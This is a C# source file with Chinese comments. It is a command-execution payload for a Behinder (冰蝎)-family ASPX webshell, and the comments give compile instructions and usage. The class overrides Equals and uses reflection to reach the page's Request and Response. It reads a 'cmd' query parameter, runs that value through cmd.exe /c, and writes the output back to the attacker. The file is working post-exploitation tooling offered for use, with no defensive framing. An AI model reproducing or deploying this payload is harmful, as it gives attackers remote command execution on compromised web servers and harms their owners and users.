using System;
using System.Diagnostics;
using System.Reflection;

// 冰蝎(Behinder)系 ASPX 马通用命令执行载荷。
// 编译: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /target:library /out:U.dll U.cs
//   (git-bash 里先 cd 到目标目录用相对路径，原生工具不吃 /c/ 正斜杠路径)
// 原理: 马解密载荷后执行 CreateInstance("U").Equals(this)，this=Page；
//       这里用反射拿 Page.Response/Page.Request，免 System.Web 编译引用。
// 用法: POST 加密后的 U.dll 到马，URL 带 ?cmd=<命令>，输出写回 Response。
public class U
{
    public override bool Equals(object obj)
    {
        try
        {
            object page = obj;
            object resp = page.GetType().GetProperty("Response").GetValue(page, null);
            MethodInfo write = resp.GetType().GetMethod("Write", new Type[] { typeof(string) });
            object req = page.GetType().GetProperty("Request").GetValue(page, null);
            object qs = req.GetType().GetProperty("QueryString").GetValue(req, null);
            object cmd = qs.GetType().GetMethod("Get", new Type[] { typeof(string) }).Invoke(qs, new object[] { "cmd" });
            string c = cmd == null ? "" : cmd.ToString();
            if (string.IsNullOrEmpty(c)) { write.Invoke(resp, new object[] { "ERR:no cmd" }); return false; }
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + c;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();
            string o = p.StandardOutput.ReadToEnd() + "\n[stderr]\n" + p.StandardError.ReadToEnd();
            p.WaitForExit();
            write.Invoke(resp, new object[] { "<pre>" + o + "</pre>" });
        }
        catch (Exception ex)
        {
            try
            {
                object resp = obj.GetType().GetProperty("Response").GetValue(obj, null);
                resp.GetType().GetMethod("Write", new Type[] { typeof(string) }).Invoke(resp, new object[] { "EXC: " + ex.ToString() });
            }
            catch { }
        }
        return false;
    }
    public override int GetHashCode() { return 12345; }
}
